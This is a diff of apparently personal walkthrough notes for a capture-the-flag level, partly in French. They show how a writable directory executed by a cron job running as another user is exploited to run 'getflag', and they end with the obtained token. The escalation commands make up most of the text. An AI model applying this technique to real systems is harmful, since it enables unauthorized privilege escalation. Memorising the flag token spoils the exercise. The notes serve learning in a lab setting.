@@ -1,5 +1,10 @@
-find / -user level05 2>/dev/null
+find / -user flag05 2>/dev/null
 >/usr/sbin/openarenaserver
+>/rofs/usr/sbin/openarenaserver
+
+cd /var/mail/
+cat level05
+> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
 cat /usr/sbin/openarenaserver
 >#!/bin/sh
@@ -9,5 +14,10 @@ cat /usr/sbin/openarenaserver
 >	rm -f "$i"
 >done
 
-je sais qu'on peut voir que c'est un script qui est exec toutes les 2min mais je sais plus où et j'ai pas encore
-cherché mais oklm
+ls /opt/openarenaserver/
+>
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+
+cat /tmp/flag
+>Check flag.Here is your token : viuaaale9huek52boumoomioc
